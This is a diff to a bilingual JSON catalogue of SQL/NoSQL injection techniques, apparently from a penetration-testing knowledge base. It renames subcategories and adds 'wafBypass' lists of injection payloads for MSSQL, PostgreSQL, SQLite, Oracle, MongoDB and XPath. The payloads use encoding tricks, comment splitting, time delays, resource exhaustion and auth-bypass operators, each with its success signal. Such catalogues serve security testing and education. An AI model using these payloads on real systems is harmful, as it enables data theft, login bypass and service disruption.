@@ -42,8 +42,8 @@
         "en": "SQL/NoSQL Injection"
       },
       "subCategory": {
-        "zh": "基础语法边界探测",
-        "en": "Basic Syntax-Boundary Probing"
+        "zh": "载体与场景变体",
+        "en": "Carriers & Context Variants"
       },
       "tutorial": {
         "overview": {
@@ -138,7 +138,53 @@
           "added-authoritative-references",
           "defined-success-and-false-positive-evidence"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "全量百分号编码",
+            "en": "Full Percent-Encoding"
+          },
+          "command": "%27%20or%201%3D1--%20\n%61%64%6D%69%6E%27--",
+          "description": {
+            "zh": "绕过对明文引号与关键字的原始匹配：载荷整体百分号编码；应用解码后注入成立即成功。",
+            "en": "Fully percent-encode the payload to evade raw quote/keyword matching; an effective decoded injection confirms success."
+          }
+        },
+        {
+          "title": {
+            "zh": "双重编码引号",
+            "en": "Doubly Encoded Quote"
+          },
+          "command": "%2527%2520or%25201%253D1--",
+          "description": {
+            "zh": "绕过只解码一次的 WAF：引号与运算符二次编码，第二层在应用内还原；语法报错出现即成功。",
+            "en": "Encode the quote and operators twice for WAFs decoding once, with the second layer restored inside the app; a syntax error confirms success."
+          }
+        },
+        {
+          "title": {
+            "zh": "反引号与括号闭合",
+            "en": "Backtick and Parenthesis Closure"
+          },
+          "command": "1%60--%20\n1%29%20or%20%281%3D1",
+          "description": {
+            "zh": "探测非常规闭合字符并绕过针对单双引号的过滤：反引号与括号闭合变体；闭合成功引发报错即成功。",
+            "en": "Probe non-standard closure characters to bypass quote-centric filters; a closure-induced error confirms success."
+          }
+        },
+        {
+          "title": {
+            "zh": "大小写与注释组合",
+            "en": "Case and Comment Combination"
+          },
+          "command": "Admin'/**/or/**/1=1#",
+          "description": {
+            "zh": "绕过区分大小写且按空格分词的规则：用户名混合大小写并以注释替代空格；认证被绕过即成功。",
+            "en": "Mix case and replace spaces with comments against case-sensitive tokenizing rules; a bypassed authentication confirms success."
+          }
+        }
+      ]
     },
     {
       "id": "sqli2-union",
@@ -179,8 +225,8 @@
         "en": "SQL/NoSQL Injection"
       },
       "subCategory": {
-        "zh": "UNION 列数对齐（跨库通用）",
-        "en": "Cross-DBMS UNION Column Alignment"
+        "zh": "回显提取与堆叠写入",
+        "en": "In-band Extraction & Stacked Writes"
       },
       "tutorial": {
         "overview": {
@@ -271,7 +317,42 @@
           "added-authoritative-references",
           "defined-success-and-false-positive-evidence"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "UNION ALL 加注释",
+            "en": "UNION ALL with Comments"
+          },
+          "command": "' UNION/**/ALL/**/SELECT NULL,NULL--",
+          "description": {
+            "zh": "绕过对 UNION SELECT 紧邻特征的规则：改用 UNION ALL 并注释分词；NULL 列回显正常即成功。",
+            "en": "Switch to UNION ALL with comment splitting against adjacency signatures; normal NULL-column echoing confirms success."
+          }
+        },
+        {
+          "title": {
+            "zh": "垂直制表符分隔",
+            "en": "Vertical-Tab Separators"
+          },
+          "command": "%27%0BUNION%0BSELECT%0B1,2,3--",
+          "description": {
+            "zh": "绕过仅把空格视为分隔符的 WAF：用 %0B 垂直制表符作词间空白；三列回显即成功。",
+            "en": "Use %0B as inter-token whitespace against space-only tokenizers; a three-column echo confirms success."
+          }
+        },
+        {
+          "title": {
+            "zh": "十六进制列值回显",
+            "en": "Hex Column Values"
+          },
+          "command": "' UNION SELECT 0x31,0x32,0x33--",
+          "description": {
+            "zh": "绕过对数字列值指纹的检测：列值用十六进制字面量；回显 123 即成功。",
+            "en": "Use hex literals as column values to defeat numeric fingerprinting; an echoed 123 confirms success."
+          }
+        }
+      ]
     },
     {
       "id": "sqli2--ext",
@@ -312,8 +393,8 @@
         "en": "SQL/NoSQL Injection"
       },
       "subCategory": {
-        "zh": "报错型 SQL 注入",
-        "en": "Error-Based SQL Injection"
+        "zh": "回显提取与堆叠写入",
+        "en": "In-band Extraction & Stacked Writes"
       },
       "tutorial": {
         "overview": {
@@ -391,7 +472,42 @@
           "added-authoritative-references",
           "defined-success-and-false-positive-evidence"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "CAST 替代 CONVERT",
+            "en": "CAST Instead of CONVERT"
+          },
+          "command": "' AND 1=CAST((SELECT @@version) AS int)--",
+          "description": {
+            "zh": "绕过对 CONVERT 关键字的专项过滤：等价改用 CAST 触发类型报错；报错含数据库版本即成功。",
+            "en": "Swap CONVERT for the equivalent CAST to trigger the type error under keyword filtering; the version string in the error confirms success."
+          }
+        },
+        {
+          "title": {
+            "zh": "注释分词报错链",
+            "en": "Comment-Split Error Chain"
+          },
+          "command": "' A/**/ND 1=CON/**/VERT(int,(SEL/**/ECT database()))--",
+          "description": {
+            "zh": "绕过对 AND CONVERT SELECT 连续特征的匹配：各关键字注释分词；报错仍带出库名即成功。",
+            "en": "Comment-split each keyword in the error chain; the error still leaking the database name confirms success."
+          }
+        },
+        {
+          "title": {
+            "zh": "关键字双写绕过",
+            "en": "Keyword Double-Write Bypass"
+          },
+          "command": "' AND 1=CONCONVERTVERT(int,(SELECT @@version))--",
+          "description": {
+            "zh": "绕过执行单次关键字删除的过滤逻辑：CONVERT 双写，删除一层后剩余合法函数；报错带出版本即成功。",
+            "en": "Double-write CONVERT so single-pass removal leaves the valid function; the version appearing in the error confirms success."
+          }
+        }
+      ]
     },
     {
       "id": "sqli2-mssql",
@@ -432,8 +548,8 @@
         "en": "SQL/NoSQL Injection"
       },
       "subCategory": {
-        "zh": "Microsoft SQL Server 注入",
-        "en": "Microsoft SQL Server Injection"
+        "zh": "MSSQL 注入",
+        "en": "MSSQL Injection"
       },
       "tutorial": {
         "overview": {
@@ -510,7 +626,42 @@
           "added-authoritative-references",
           "defined-success-and-false-positive-evidence"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "条件无空格 WAITFOR",
+            "en": "Conditional Space-Free WAITFOR"
+          },
+          "command": "1';IF(1=1)WAITFOR/**/DELAY'0:0:3'--",
+          "description": {
+            "zh": "绕过对 WAITFOR DELAY 明文与空格分词的规则：条件包裹加注释替代空格；响应延迟 3 秒即成功。",
+            "en": "Wrap in a conditional and replace spaces with comments against plaintext WAITFOR DELAY rules; a 3-second delay confirms success."
+          }
+        },
+        {
+          "title": {
+            "zh": "忙等循环替代延迟",
+            "en": "Busy-Wait Loop Alternative"
+          },
+          "command": "1';DECLARE @s DATETIME=GETDATE();WHILE DATEDIFF(SECOND,@s,GETDATE())<3 BEGIN END--",
+          "description": {
+            "zh": "绕过对 WAITFOR 函数名的封锁：用 T-SQL 忙等循环制造延迟；响应耗时约 3 秒即成功。",
+            "en": "Produce the delay with a T-SQL busy-wait loop when WAITFOR is blocked; a roughly 3-second response confirms success."
+          }
+        },
+        {
+          "title": {
+            "zh": "全量 URL 编码载体",
+            "en": "Fully URL-Encoded Carrier"
+          },
+          "command": "%3BWAITFOR%20DELAY%20%270%3A0%3A3%27--",
+          "description": {
+            "zh": "绕过对原始字符形的匹配：整句百分号编码后传输；应用解码后延迟生效即成功。",
+            "en": "Transport the whole statement percent-encoded; the delay taking effect after application decoding confirms success."
+          }
+        }
+      ]
     },
     {
       "id": "sqli2-postgresql",
@@ -551,8 +702,8 @@
         "en": "SQL/NoSQL Injection"
       },
       "subCategory": {
-        "zh": "PostgreSQL 注入",
-        "en": "PostgreSQL Injection"
+        "zh": "PostgreSQL 与 SQLite 注入",
+        "en": "PostgreSQL & SQLite Injection"
       },
       "tutorial": {
         "overview": {
@@ -629,7 +780,42 @@
           "added-authoritative-references",
           "defined-success-and-false-positive-evidence"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "CASE 条件延迟",
+            "en": "CASE Conditional Delay"
+          },
+          "command": "';SELECT CASE WHEN(1=1)THEN pg_sleep(3)ELSE pg_sleep(0)END-- -",
+          "description": {
+            "zh": "绕过对 pg_sleep 直接调用的特征：包进 CASE 条件结构；真假条件延迟可区分即成功。",
+            "en": "Wrap pg_sleep inside a CASE conditional; distinguishable delays between true and false conditions confirm success."
+          }
+        },
+        {
+          "title": {
+            "zh": "generate_series 忙等",
+            "en": "generate-Series Busy Wait"
+          },
+          "command": "';SELECT COUNT(*) FROM generate_series(1,30000000)-- -",
+          "description": {
+            "zh": "绕过对 pg_sleep 函数名的封锁：大序列聚合计数制造纯计算延迟；响应显著变慢即成功。",
+            "en": "Induce pure computation delay via a huge series aggregation when pg_sleep is blocked; a clearly slower response confirms success."
+          }
+        },
+        {
+          "title": {
+            "zh": "括号无空格形态",
+            "en": "Parenthesized Space-Free Form"
+          },
+          "command": "1';SELECT(pg_sleep(3));-- -",
+          "description": {
+            "zh": "绕过基于空格分词的规则：函数调用全部括号化紧排；延迟仍触发即成功。",
+            "en": "Fully parenthesize calls with no spaces against space-based tokenizers; the delay still triggering confirms success."
+          }
+        }
+      ]
     },
     {
       "id": "sqli2-sqlite",
@@ -670,8 +856,8 @@
         "en": "SQL/NoSQL Injection"
       },
       "subCategory": {
-        "zh": "SQLite 注入",
-        "en": "SQLite Injection"
+        "zh": "PostgreSQL 与 SQLite 注入",
+        "en": "PostgreSQL & SQLite Injection"
       },
       "tutorial": {
         "overview": {
@@ -749,7 +935,42 @@
           "added-authoritative-references",
           "defined-success-and-false-positive-evidence"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "zeroblob 资源消耗替代",
+            "en": "zeroblob Resource-Exhaustion Alternative"
+          },
+          "command": "' AND 1=zeroblob(200000000)--",
+          "description": {
+            "zh": "绕过对 randomblob 函数名的拦截：等价改用 zeroblob 占用内存；响应时间显著增加即成功。",
+            "en": "Switch to zeroblob for the same exhaustion goal when randomblob is blocked; a markedly increased response time confirms success."
+          }
+        },
+        {
+          "title": {
+            "zh": "递归 CTE 循环",
+            "en": "Recursive CTE Loop"
+          },
+          "command": "WITH/**/RECURSIVE/**/t(x)AS(SELECT 1 UNION/**/ALL/**/SELECT x+1 FROM t LIMIT 200000000)SELECT/**/MAX(x)FROM t--",
+          "description": {
+            "zh": "绕过对 BLOB 函数族的封锁：递归公共表表达式自增循环消耗 CPU；查询耗时明显变长即成功。",
+            "en": "Burn CPU with a recursive CTE when BLOB functions are blocked; a visibly longer query time confirms success."
+          }
+        },
+        {
+          "title": {
+            "zh": "注释分词与大小写",
+            "en": "Comment Splitting with Case"
+          },
+          "command": "' An/**/d 1=RANDO/**/MBLOB(500000000)--",
+          "description": {
+            "zh": "绕过对 AND randomblob 小写全字匹配：注释插入 AND 内部并混合大小写；资源消耗行为发生即成功。",
+            "en": "Insert comments inside AND and mix case against lowercase whole-word matching; the exhaustion behavior occurring confirms success."
+          }
+        }
+      ]
     },
     {
       "id": "sqli2-oracle",
@@ -790,8 +1011,8 @@
         "en": "SQL/NoSQL Injection"
       },
       "subCategory": {
-        "zh": "Oracle Database 注入",
-        "en": "Oracle Database Injection"
+        "zh": "Oracle 注入",
+        "en": "Oracle Injection"
       },
       "tutorial": {
         "overview": {
@@ -868,7 +1089,42 @@
           "added-authoritative-references",
           "defined-success-and-false-positive-evidence"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "XMLType 报错回显",
+            "en": "XMLType Error Echo"
+          },
+          "command": "' AND 1=XMLType(concat('<a>',(SELECT banner FROM v$version WHERE ROWNUM=1),'</a>'))--",
+          "description": {
+            "zh": "绕过对 utl_inaddr 特征库的拦截：改用 XMLType 解析报错带出版本；报错含 banner 即成功。",
+            "en": "Leak the banner via the XMLType parse error when utl_inaddr is signature-blocked; the banner inside the error confirms success."
+          }
+        },
+        {
+          "title": {
+            "zh": "CTXSYS 报错回显",
+            "en": "CTXSYS Error Echo"
+          },
+          "command": "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))--",
+          "description": {
+            "zh": "绕过对 UTL_* 网络函数族的统一封锁：用全文索引包的参数报错通道；报错文本含版本信息即成功。",
+            "en": "Use the text-index package error channel when UTL_* functions are blocked wholesale; version information in the error text confirms success."
+          }
+        },
+        {
+          "title": {
+            "zh": "纯大小写混淆",
+            "en": "Pure Case Obfuscation"
+          },
+          "command": "' aNd 1=UtL_InAdDr.GeT_HoSt_AdDrEsS((SeLeCt banner FrOm v$version WhErE RoWnUm=1))--",
+          "description": {
+            "zh": "绕过区分大小写的特征匹配：保留语义仅变形大小写；报错仍回显版本即成功。",
+            "en": "Preserve semantics while only mutating case against case-sensitive matching; the error still echoing the version confirms success."
+          }
+        }
+      ]
     },
     {
       "id": "sqli2-awesome-waf",
@@ -1039,8 +1295,8 @@
         "en": "SQL/NoSQL Injection"
       },
       "subCategory": {
-        "zh": "LIKE/BETWEEN/IN 运算符替代",
-        "en": "LIKE/BETWEEN/IN Operator Substitution"
+        "zh": "盲注与带外探测",
+        "en": "Blind & Out-of-band Detection"
       },
       "tutorial": {
         "overview": {
@@ -1117,7 +1373,42 @@
           "added-authoritative-references",
           "defined-success-and-false-positive-evidence"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "REGEXP 替代运算符组",
+            "en": "REGEXP Operator Replacement"
+          },
+          "command": "1' AND 'a' REGEXP '^[a-b]'--",
+          "description": {
+            "zh": "绕过对 LIKE/BETWEEN/IN 已被加入规则库的场景：换用 REGEXP 正则谓词；真假条件响应可区分即成功。",
+            "en": "Switch to REGEXP predicates when LIKE/BETWEEN/IN are already signature-listed; distinguishable true/false responses confirm success."
+          }
+        },
+        {
+          "title": {
+            "zh": "GREATEST 与 LEAST 谓词",
+            "en": "GREATEST and LEAST Predicates"
+          },
+          "command": "1' AND GREATEST(1,2)=2--\n1' AND LEAST(0,1)=0--",
+          "description": {
+            "zh": "绕过对比较运算符族的过滤：用极值函数构造等价布尔表达式；条件差异稳定复现即成功。",
+            "en": "Build equivalent booleans with min/max functions against comparison-operator filters; stably reproducible condition differences confirm success."
+          }
+        },
+        {
+          "title": {
+            "zh": "注释分词大小写",
+            "en": "Comment Splitting with Case"
+          },
+          "command": "1' An/**/d 1 Li/**/ke 1-- -",
+          "description": {
+            "zh": "绕过对 AND LIKE 小写全字匹配：关键字内插注释并混合大小写；谓词语义保持即成功。",
+            "en": "Insert comments inside keywords with mixed case against lowercase whole-word matching; preserved predicate semantics confirm success."
+          }
+        }
+      ]
     },
     {
       "id": "sqli2-and-or",
@@ -1277,8 +1568,8 @@
         "en": "SQL/NoSQL Injection"
       },
       "subCategory": {
-        "zh": "LIMIT/OFFSET/FETCH 注入",
-        "en": "LIMIT/OFFSET/FETCH Injection"
+        "zh": "盲注与带外探测",
+        "en": "Blind & Out-of-band Detection"
       },
       "tutorial": {
         "overview": {
@@ -1355,7 +1646,42 @@
           "added-authoritative-references",
           "defined-success-and-false-positive-evidence"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "括号无空格子句",
+            "en": "Parenthesized Space-Free Clauses"
+          },
+          "command": "1'/**/LIMIT(1)OFFSET(0)--",
+          "description": {
+            "zh": "绕过按空格分词识别 LIMIT 的规则：子句值括号化紧排；行集按预期截断即成功。",
+            "en": "Parenthesize clause values with no spaces against space-tokenized LIMIT detection; the rowset truncating as expected confirms success."
+          }
+        },
+        {
+          "title": {
+            "zh": "逗号式分页加注释",
+            "en": "Comma Pagination with Comments"
+          },
+          "command": "1' LIMIT/**/0,1--",
+          "description": {
+            "zh": "绕过对 OFFSET 关键字的过滤：改用逗号分页语法并注释分词；单行结果返回即成功。",
+            "en": "Use comma pagination instead of OFFSET keywords with comment splitting; a single-row result confirms success."
+          }
+        },
+        {
+          "title": {
+            "zh": "FETCH 尾部注释变形",
+            "en": "FETCH Tail Comment Variant"
+          },
+          "command": "1' OFFSET 1 ROWS FETCH/**/NEXT 1 ROWS/**/ONLY--",
+          "description": {
+            "zh": "绕过对 OFFSET FETCH 整句特征的匹配：FETCH 与行数子句注释分离；受限行集返回即成功。",
+            "en": "Comment-separate FETCH and row-count clauses against whole-phrase matching; a restricted rowset returning confirms success."
+          }
+        }
+      ]
     },
     {
       "id": "sqli2-information-schema",
@@ -1772,8 +2098,8 @@
         "en": "SQL/NoSQL Injection"
       },
       "subCategory": {
-        "zh": "布尔盲注闭合探测",
-        "en": "Boolean Blind Closure Probing"
+        "zh": "盲注与带外探测",
+        "en": "Blind & Out-of-band Detection"
       },
       "tutorial": {
         "overview": {
@@ -1864,7 +2190,42 @@
           "added-authoritative-references",
           "defined-success-and-false-positive-evidence"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "逻辑与短路闭合",
+            "en": "Logical AND Short-Circuit Closure"
+          },
+          "command": "1' AND 1=1&&1#",
+          "description": {
+            "zh": "绕过对注释符前必须空格的解析假设：用 && 短路接注释收尾；真值条件响应与基线一致即成功。",
+            "en": "Chain a short-circuit && into the closing comment against spacing assumptions; a true-condition response matching baseline confirms success."
+          }
+        },
+        {
+          "title": {
+            "zh": "反引号闭合变体",
+            "en": "Backtick Closure Variant"
+          },
+          "command": "1` AND 1=1#",
+          "description": {
+            "zh": "探测反引号上下文并绕过引号过滤：直接反引号闭合后接条件；数据库报错语义变化即成功。",
+            "en": "Close with a backtick to probe identifier contexts under quote filtering; a changed error semantics confirms success."
+          }
+        },
+        {
+          "title": {
+            "zh": "换行内联注释",
+            "en": "Newline Inline Comment"
+          },
+          "command": "1'--%0AAND 1=1",
+          "description": {
+            "zh": "绕过把 -- 后内容整行丢弃的单行解析器：注释后接换行使后续条件落到下一行被解析；条件差异出现即成功。",
+            "en": "Follow the comment with a newline so trailing conditions survive single-line parsers; an appearing conditional difference confirms success."
+          }
+        }
+      ]
     },
     {
       "id": "sqli2-nosql",
@@ -1905,8 +2266,8 @@
         "en": "SQL/NoSQL Injection"
       },
       "subCategory": {
-        "zh": "MongoDB 运算符注入变体集",
-        "en": "MongoDB Operator Injection Variant Set"
+        "zh": "NoSQL 与查询语言注入",
+        "en": "NoSQL & Query Language Injection"
       },
       "tutorial": {
         "overview": {
@@ -1997,7 +2358,53 @@
           "added-authoritative-references",
           "defined-success-and-false-positive-evidence"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "$regex 运算符绕过",
+            "en": "$regex Operator Bypass"
+          },
+          "command": "{\"username\":{\"$regex\":\"^admin\"},\"password\":{\"$regex\":\".\"}}",
+          "description": {
+            "zh": "绕过对 $ne/$gt 已加黑的 NoSQL 注入检测：换用 $regex 正则匹配构造恒真条件；登录通过或数据返回即成功。",
+            "en": "Swap blacklisted $ne/$gt operators for $regex always-true matching; a successful login or returned data confirms success."
+          }
+        },
+        {
+          "title": {
+            "zh": "$where JavaScript 注入",
+            "en": "$where JavaScript Injection"
+          },
+          "command": "{\"$where\":\"this.username.length>0 && this.password.length>0\"}",
+          "description": {
+            "zh": "绕过对运算符键名的黑名单：把条件写入 $where 服务端 JS 表达式；查询命中任意账户即成功。",
+            "en": "Move the condition into a server-side $where JS expression to bypass operator-key blacklists; any matching account confirms success."
+          }
+        },
+        {
+          "title": {
+            "zh": "表单数组语法",
+            "en": "Form Array Syntax"
+          },
+          "command": "username[$regex]=^admin&password[$regex]=.",
+          "description": {
+            "zh": "绕过 JSON 体检测规则：以 PHP 风格数组参数在表单里传运算符；认证绕过生效即成功。",
+            "en": "Pass operators via PHP-style array parameters in a form to bypass JSON-body rules; an effective auth bypass confirms success."
+          }
+        },
+        {
+          "title": {
+            "zh": "$type 类型混淆",
+            "en": "$type Type Confusion"
+          },
+          "command": "{\"username\":{\"$type\":2},\"password\":{\"$type\":2}}",
+          "description": {
+            "zh": "绕过对值内容敏感的过滤器：仅按 BSON 类型匹配字符串字段；返回字符串型记录即成功。",
+            "en": "Match only by BSON string type to bypass value-content filters; string-typed records returning confirms success."
+          }
+        }
+      ]
     },
     {
       "id": "sqli2-time-based-blind-sqli",
@@ -2038,8 +2445,8 @@
         "en": "SQL/NoSQL Injection"
       },
       "subCategory": {
-        "zh": "跨数据库时间盲注",
-        "en": "Cross-DBMS Time-Based Blind Injection"
+        "zh": "盲注与带外探测",
+        "en": "Blind & Out-of-band Detection"
       },
       "tutorial": {
         "overview": {
@@ -2116,7 +2523,42 @@
           "added-authoritative-references",
           "defined-success-and-false-positive-evidence"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "BENCHMARK 计算延迟",
+            "en": "BENCHMARK Computation Delay"
+          },
+          "command": "1' AND BENCHMARK(8000000,SHA1(0x41))--",
+          "description": {
+            "zh": "绕过对 SLEEP 关键字的拦截：重哈希计算制造等价延迟；响应时间较基线多出数秒即成功。",
+            "en": "Induce an equivalent delay via repeated hashing when SLEEP is blocked; several extra seconds versus baseline confirm success."
+          }
+        },
+        {
+          "title": {
+            "zh": "括号紧排嵌套",
+            "en": "Parenthesized Tight Nesting"
+          },
+          "command": "%27||SELECT(1)AND(SELECT(1)FROM(SELECT(SLEEP(5)))a)||%27",
+          "description": {
+            "zh": "绕过空格分词与 SELECT FROM 特征：全括号紧排并借派生表包裹延迟函数；5 秒延迟触发即成功。",
+            "en": "Fully parenthesized tight nesting with a derived-table wrapper; the 5-second delay triggering confirms success."
+          }
+        },
+        {
+          "title": {
+            "zh": "GET_LOCK 双会话延迟",
+            "en": "GET_LOCK Two-Session Delay"
+          },
+          "command": "1' AND GET_LOCK(0x61,5)--",
+          "description": {
+            "zh": "绕过对延迟函数族的整体封锁：请求命名锁并等待超时；在无竞争时立即返回、有持锁会话时延迟即成功。",
+            "en": "Request a named lock and wait out the timeout when the delay-function family is blocked; delayed return under a held lock confirms success."
+          }
+        }
+      ]
     },
     {
       "id": "sqli2-dbms-specific-patterns-db2-sql",
@@ -2551,8 +2993,8 @@
         "en": "SQL/NoSQL Injection"
       },
       "subCategory": {
-        "zh": "XPath 查询注入",
-        "en": "XPath Query Injection"
+        "zh": "NoSQL 与查询语言注入",
+        "en": "NoSQL & Query Language Injection"
       },
       "tutorial": {
         "overview": {
@@ -2629,7 +3071,42 @@
           "added-authoritative-references",
           "defined-success-and-false-positive-evidence"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "substring 盲提取谓词",
+            "en": "substring Blind Extraction Predicate"
+          },
+          "command": "' and substring(/root/child::node()[1]/text(),1,1)='P'",
+          "description": {
+            "zh": "绕过对整节点回显的过滤：按字符位置切片做布尔盲提取；真假条件可区分即成功。",
+            "en": "Slice by character position for boolean blind extraction when whole-node echoing is filtered; distinguishable true/false conditions confirm success."
+          }
+        },
+        {
+          "title": {
+            "zh": "XML 实体编码引号",
+            "en": "XML Entity-Encoded Quotes"
+          },
+          "command": "&#x27; or 1=1 or &#x27;=&#x27;",
+          "description": {
+            "zh": "在 XML 载体场景绕过引号字符过滤：引号以十六进制实体表示，解析后还原；谓词成立改变结果集即成功。",
+            "en": "Encode quotes as hex entities for XML carriers where raw quotes are filtered; an altered result set when parsed confirms success."
+          }
+        },
+        {
+          "title": {
+            "zh": "节点集联合定位",
+            "en": "Node-Set Union Targeting"
+          },
+          "command": "' | //user[2]/*",
+          "description": {
+            "zh": "绕过对布尔谓词特征的检测：用竖杠做 XPath 节点集联合直接定位第二用户节点；返回目标节点数据即成功。",
+            "en": "Union node sets with a pipe to directly target nodes, evading boolean-predicate detection; returned target-node data confirms success."
+          }
+        }
+      ]
     }
   ]
 }
